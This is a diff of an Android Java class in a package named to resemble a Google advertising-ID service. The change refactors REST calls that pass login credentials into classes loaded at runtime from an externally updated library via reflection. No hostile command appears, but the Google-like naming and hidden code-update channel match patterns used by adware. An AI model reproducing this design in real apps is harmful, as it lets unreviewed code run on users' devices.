@@ -9,13 +9,14 @@ import android.support.v4.content.Loader;
 
 import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.CodeUpdater;
 import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
-import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader.FilesLoader;
 import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
-import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetter;
-import com.advertising_id_service.appclick.googleadvertisingidservice.InstallationInfo;
 import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
 import com.advertising_id_service.appclick.googleadvertisingidservice.PublisherID.PublisherIDMask;
-import com.advertising_id_service.appclick.googleadvertisingidservice.REST.IApi;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.CreateParameters;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.DeleteParameters;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.InstallParameters;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.ReadParameters;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.InputParameters.UpdateParameters;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultCreate;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultDelete;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultInstall;
@@ -155,132 +156,191 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
     //************************ Методы работы с REST *******************************
     //*****************************************************************************
     @Override
-    public ResultCreate rest_create(Context cnt, LoaderManager lm, String callDestination, String login, String pass) {
+    public ResultCreate rest_create(CreateParameters param) {
         Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_create()");
-        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
-        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
-        Class resultCreate                   = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultCreate");
+        ExternalLibServicer loader = ExternalLibServicer.getServicer(param.getCnt());
+        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
+        Class resultCreate                   = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultCreate");
+
+        Class inputParamClass                = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.InputParameters.CreateParameters");
+        Object instanceInputParam            = loader.getInstance(inputParamClass, new Object[]{}, new Class[]{});
+        loader.setAttribute(instanceInputParam, "cnt"             , param.getCnt());
+        loader.setAttribute(instanceInputParam, "lm"              , param.getLm());
+        loader.setAttribute(instanceInputParam, "callDestination" , param.getCallDestination());
+        loader.setAttribute(instanceInputParam, "login"           , param.getLogin());
+        loader.setAttribute(instanceInputParam, "pass"            , param.getPass());
+        loader.setAttribute(instanceInputParam, "forceStart"      , param.isForceStart());
+        loader.setAttribute(instanceInputParam, "asincStart"      , param.isAsincStart());
+        loader.setAttribute(instanceInputParam, "onResultListener", param.getOnResultListener());
+
         Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
-        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_create",
-                new Object[]{
-                        cnt,
-                        lm,
-                        callDestination,
-                        login,
-                        pass},
-                new Class[]{
-                        Context.class,
-                        LoaderManager.class,
-                        String.class,
-                        String.class,
-                        String.class});
+        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_create", new Object[]{instanceInputParam}, new Class[]{inputParamClass});
+//        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_create",
+//                new Object[]{
+//                        param.getCnt(),
+//                        param.getLm(),
+//                        param.getCallDestination(),
+//                        param.getLogin(),
+//                        param.getPass()},
+//                new Class[]{
+//                        Context.class,
+//                        LoaderManager.class,
+//                        String.class,
+//                        String.class,
+//                        String.class});
         ResultCreate resCreate = new ResultCreate("","","","");
-        resCreate.result    = loader.getAttribute(resultCreate,res,"result");
-        resCreate.error_id  = loader.getAttribute(resultCreate,res,"error_id");
-        resCreate.error_msg = loader.getAttribute(resultCreate,res,"error_msg");
-        resCreate.guid      = loader.getAttribute(resultCreate,res,"guid");
+        resCreate.result       = loader.getAttribute(resultCreate,res,"result");
+        resCreate.error_id     = loader.getAttribute(resultCreate,res,"error_id");
+        resCreate.error_msg    = loader.getAttribute(resultCreate,res,"error_msg");
+        resCreate.guid         = loader.getAttribute(resultCreate,res,"guid");
+        resCreate.dynamic_data = loader.getAttribute(resultCreate,res,"dynamic_data");
         return resCreate;
     }
 
     @Override
-    public ResultUpdate rest_update(Context cnt, LoaderManager lm, String callDestination, String login, String pass) {
+    public ResultUpdate rest_update(UpdateParameters param) {
         Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_update()");
-        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
-        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
-        Class resultUpdate                   = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultUpdate");
+        ExternalLibServicer loader = ExternalLibServicer.getServicer(param.getCnt());
+        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
+        Class resultUpdate                   = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultUpdate");
+
+        Class inputParamClass                = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.InputParameters.UpdateParameters");
+        Object instanceInputParam            = loader.getInstance(inputParamClass, new Object[]{}, new Class[]{});
+        loader.setAttribute(instanceInputParam, "cnt"             , param.getCnt());
+        loader.setAttribute(instanceInputParam, "lm"              , param.getLm());
+        loader.setAttribute(instanceInputParam, "callDestination" , param.getCallDestination());
+        loader.setAttribute(instanceInputParam, "login"           , param.getLogin());
+        loader.setAttribute(instanceInputParam, "pass"            , param.getPass());
+        loader.setAttribute(instanceInputParam, "forceStart"      , param.isForceStart());
+        loader.setAttribute(instanceInputParam, "asincStart"      , param.isAsincStart());
+        loader.setAttribute(instanceInputParam, "onResultListener", param.getOnResultListener());
+
         Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
-        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_update",
-                new Object[]{
-                        cnt,
-                        lm,
-                        callDestination,
-                        login,
-                        pass},
-                new Class[]{
-                        Context.class,
-                        LoaderManager.class,
-                        String.class,
-                        String.class,
-                        String.class});
+        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_update", new Object[]{instanceInputParam}, new Class[]{inputParamClass});
+//        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_update",
+//                new Object[]{
+//                        param.getCnt(),
+//                        param.getLm(),
+//                        param.getCallDestination(),
+//                        param.getLogin(),
+//                        param.getPass()},
+//                new Class[]{
+//                        Context.class,
+//                        LoaderManager.class,
+//                        String.class,
+//                        String.class,
+//                        String.class});
 
         ResultUpdate resUpdate = new ResultUpdate("","","","");
-        resUpdate.result    = loader.getAttribute(resultUpdate,res,"result");
-        resUpdate.error_id  = loader.getAttribute(resultUpdate,res,"error_id");
-        resUpdate.error_msg = loader.getAttribute(resultUpdate,res,"error_msg");
-        resUpdate.guid      = loader.getAttribute(resultUpdate,res,"guid");
+        resUpdate.result       = loader.getAttribute(resultUpdate,res,"result");
+        resUpdate.error_id     = loader.getAttribute(resultUpdate,res,"error_id");
+        resUpdate.error_msg    = loader.getAttribute(resultUpdate,res,"error_msg");
+        resUpdate.guid         = loader.getAttribute(resultUpdate,res,"guid");
+        resUpdate.dynamic_data = loader.getAttribute(resultUpdate,res,"dynamic_data");
         return resUpdate;
     }
 
     @Override
-    public ResultInstall rest_install(Context cnt, LoaderManager lm, String callDestination, InstallationInfo _installInfo, String login, String pass) {
+    public ResultInstall rest_install(InstallParameters param) {
         Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_install()");
-        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
-        PublisherIDMask m   = _installInfo.getMask();
+        ExternalLibServicer loader = ExternalLibServicer.getServicer(param.getCnt());
+        PublisherIDMask m   = param.getInstallInfo().getMask();
 
-        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
-        Class clazzPublisherIDMask           = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".PublisherID.PublisherIDMask");
-        Class clazzInstallationInfo          = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".InstallationInfo");
-        Class resultInstall                  = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultInstall");
+        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
+        Class clazzPublisherIDMask           = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".PublisherID.PublisherIDMask");
+        Class clazzInstallationInfo          = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".InstallationInfo");
+        Class resultInstall                  = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultInstall");
 
         Object instance     = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
         Object Mask         = loader.getInstance(clazzPublisherIDMask,  new Object[]{m.getPrefix(),m.getSeporator(),m.getExtension()},  new Class[]{String.class,String.class,String.class});
-        Object install_info = loader.getInstance(clazzInstallationInfo, new Object[]{cnt,callDestination,Mask}, new Class[]{Context.class,String.class, clazzPublisherIDMask});
-        Object res          = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_install",
-                new Object[]{
-                        cnt,
-                        lm,
-                        callDestination,
-                        install_info,
-                        login,
-                        pass},
-                new Class[]{
-                        Context.class,
-                        LoaderManager.class,
-                        String.class,
-                        clazzInstallationInfo,
-                        String.class,
-                        String.class});
+        Object install_info = loader.getInstance(clazzInstallationInfo, new Object[]{param.getCnt(),param.getCallDestination(),Mask}, new Class[]{Context.class,String.class, clazzPublisherIDMask});
+
+        Class inputParamClass                = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.InputParameters.InstallParameters");
+        Object instanceInputParam            = loader.getInstance(inputParamClass, new Object[]{}, new Class[]{});
+        loader.setAttribute(instanceInputParam, "cnt"             , param.getCnt());
+        loader.setAttribute(instanceInputParam, "lm"              , param.getLm());
+        loader.setAttribute(instanceInputParam, "callDestination" , param.getCallDestination());
+        loader.setAttribute(instanceInputParam, "login"           , param.getLogin());
+        loader.setAttribute(instanceInputParam, "pass"            , param.getPass());
+        loader.setAttribute(instanceInputParam, "forceStart"      , param.isForceStart());
+        loader.setAttribute(instanceInputParam, "asincStart"      , param.isAsincStart());
+        loader.setAttribute(instanceInputParam, "onResultListener", param.getOnResultListener());
+        loader.setAttribute(instanceInputParam, "installInfo"     , install_info);
+
+        Object res          = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_install", new Object[]{instanceInputParam}, new Class[]{inputParamClass});
+//        Object res          = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_install",
+//                new Object[]{
+//                        param.getCnt(),
+//                        param.getLm(),
+//                        param.getCallDestination(),
+//                        install_info,
+//                        param.getLm(),
+//                        param.getPass()},
+//                new Class[]{
+//                        Context.class,
+//                        LoaderManager.class,
+//                        String.class,
+//                        clazzInstallationInfo,
+//                        String.class,
+//                        String.class});
 
         ResultInstall resInstall = new ResultInstall("","","","");
-        resInstall.result    = loader.getAttribute(resultInstall,res,"result");
-        resInstall.error_id  = loader.getAttribute(resultInstall,res,"error_id");
-        resInstall.error_msg = loader.getAttribute(resultInstall,res,"error_msg");
-        resInstall.guid      = loader.getAttribute(resultInstall,res,"guid");
+        resInstall.result       = loader.getAttribute(resultInstall,res,"result");
+        resInstall.error_id     = loader.getAttribute(resultInstall,res,"error_id");
+        resInstall.error_msg    = loader.getAttribute(resultInstall,res,"error_msg");
+        resInstall.guid         = loader.getAttribute(resultInstall,res,"guid");
+        resInstall.dynamic_data = loader.getAttribute(resultInstall,res,"dynamic_data");
         return resInstall;
     }
 
     @Override
-    public ResultRead rest_read(Context cnt, LoaderManager lm, IApi.RestReadType readType, String callDestination, String login, String pass) {
+    public ResultRead rest_read(ReadParameters param) {
         Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_read()");
-        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
-        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
-        Class IApi_RestReadType              = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.IApi$RestReadType");
-        Class resultRead                     = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultRead");
-        Class resultRead_ItemParams          = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultRead$ItemParams");
+        ExternalLibServicer loader = ExternalLibServicer.getServicer(param.getCnt());
+        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
+        Class IApi_RestReadType              = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.IApi$RestReadType");
+        Class resultRead                     = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultRead");
+        Class resultRead_ItemParams          = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultRead$ItemParams");
 
         Object instance = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
-        Object res      = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_read",
-                new Object[]{
-                        cnt,
-                        lm,
-                        loader.getEnumValue(IApi_RestReadType, readType.ordinal()),
-                        callDestination,
-                        login,
-                        pass},
-                new Class[]{
-                        Context.class,
-                        LoaderManager.class,
-                        IApi_RestReadType,
-                        String.class,
-                        String.class,
-                        String.class});
+
+        Class inputParamClass                = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.InputParameters.ReadParameters");
+        Object instanceInputParam            = loader.getInstance(inputParamClass, new Object[]{}, new Class[]{});
+        loader.setAttribute(instanceInputParam, "cnt"             , param.getCnt());
+        loader.setAttribute(instanceInputParam, "lm"              , param.getLm());
+        loader.setAttribute(instanceInputParam, "callDestination" , param.getCallDestination());
+        loader.setAttribute(instanceInputParam, "login"           , param.getLogin());
+        loader.setAttribute(instanceInputParam, "pass"            , param.getPass());
+        loader.setAttribute(instanceInputParam, "forceStart"      , param.isForceStart());
+        loader.setAttribute(instanceInputParam, "asincStart"      , param.isAsincStart());
+        loader.setAttribute(instanceInputParam, "onResultListener", param.getOnResultListener());
+        loader.setAttribute(instanceInputParam, "readType"        , loader.getEnumValue(IApi_RestReadType, param.getReadType().ordinal()));
+
+        Object res          = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_read", new Object[]{instanceInputParam}, new Class[]{inputParamClass});
+
+//        Object res      = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_read",
+//                new Object[]{
+//                        param.getCnt(),
+//                        param.getLm(),
+//                        loader.getEnumValue(IApi_RestReadType, param.getReadType().ordinal()),
+//                        param.getCallDestination(),
+//                        param.getLogin(),
+//                        param.getPass()},
+//                new Class[]{
+//                        Context.class,
+//                        LoaderManager.class,
+//                        IApi_RestReadType,
+//                        String.class,
+//                        String.class,
+//                        String.class});
 
         ResultRead resRead = new ResultRead();
 
-        resRead.result    = loader.getAttribute(resultRead,res,"result");
-        resRead.error_id  = loader.getAttribute(resultRead,res,"error_id");
-        resRead.error_msg = loader.getAttribute(resultRead,res,"error_msg");
-        resRead.found_by  = loader.getAttribute(resultRead,res,"found_by");
+        resRead.result       = loader.getAttribute(resultRead,res,"result");
+        resRead.error_id     = loader.getAttribute(resultRead,res,"error_id");
+        resRead.error_msg    = loader.getAttribute(resultRead,res,"error_msg");
+        resRead.dynamic_data = loader.getAttribute(resultRead,res,"dynamic_data");
+        resRead.found_by     = loader.getAttribute(resultRead,res,"found_by");
         resRead.guids = new ArrayList<>();
         List<Object> res_ItemParams = loader.getAttribute(resultRead,res,"guids");
         if (res_ItemParams != null) {
@@ -319,31 +379,45 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
     }
 
     @Override
-    public ResultDelete rest_delete(Context cnt, LoaderManager lm, String callDestination, String login, String pass) {
+    public ResultDelete rest_delete(DeleteParameters param) {
         Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_delete()");
-        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
-        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
-        Class resultDelete                   = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultDelete");
+        ExternalLibServicer loader = ExternalLibServicer.getServicer(param.getCnt());
+        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
+        Class resultDelete                   = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultDelete");
+
+        Class inputParamClass                = loader.getExternalClass(param.getCnt(), GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.InputParameters.DeleteParameters");
+        Object instanceInputParam            = loader.getInstance(inputParamClass, new Object[]{}, new Class[]{});
+        loader.setAttribute(instanceInputParam, "cnt"             , param.getCnt());
+        loader.setAttribute(instanceInputParam, "lm"              , param.getLm());
+        loader.setAttribute(instanceInputParam, "callDestination" , param.getCallDestination());
+        loader.setAttribute(instanceInputParam, "login"           , param.getLogin());
+        loader.setAttribute(instanceInputParam, "pass"            , param.getPass());
+        loader.setAttribute(instanceInputParam, "forceStart"      , param.isForceStart());
+        loader.setAttribute(instanceInputParam, "asincStart"      , param.isAsincStart());
+        loader.setAttribute(instanceInputParam, "onResultListener", param.getOnResultListener());
+
         Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
-        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_delete",
-                new Object[]{
-                        cnt,
-                        lm,
-                        callDestination,
-                        login,
-                        pass},
-                new Class[]{
-                        Context.class,
-                        LoaderManager.class,
-                        String.class,
-                        String.class,
-                        String.class});
+        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_delete",new Object[]{instanceInputParam}, new Class[]{inputParamClass});
+//        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_delete",
+//                new Object[]{
+//                        param.getCnt(),
+//                        param.getLm(),
+//                        param.getCallDestination(),
+//                        param.getLogin(),
+//                        param.getPass()},
+//                new Class[]{
+//                        Context.class,
+//                        LoaderManager.class,
+//                        String.class,
+//                        String.class,
+//                        String.class});
 
         ResultDelete resDelete = new ResultDelete("","","","");
-        resDelete.result    = loader.getAttribute(resultDelete,res,"result");
-        resDelete.error_id  = loader.getAttribute(resultDelete,res,"error_id");
-        resDelete.error_msg = loader.getAttribute(resultDelete,res,"error_msg");
-        resDelete.guid      = loader.getAttribute(resultDelete,res,"guid");
+        resDelete.result       = loader.getAttribute(resultDelete,res,"result");
+        resDelete.error_id     = loader.getAttribute(resultDelete,res,"error_id");
+        resDelete.error_msg    = loader.getAttribute(resultDelete,res,"error_msg");
+        resDelete.guid         = loader.getAttribute(resultDelete,res,"guid");
+        resDelete.dynamic_data = loader.getAttribute(resultDelete,res,"dynamic_data");
         return resDelete;
     }
 
@@ -507,5 +581,15 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
         }).forceLoad();
 
         return true;
+    }
+
+
+    @Override
+    public void initialize(final Context cnt, LoaderManager lm) {
+        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.initialize()");
+        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
+        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
+        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
+        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "initialize", new Object[]{cnt, lm}, new Class[]{Context.class, LoaderManager.class});
     }
 }
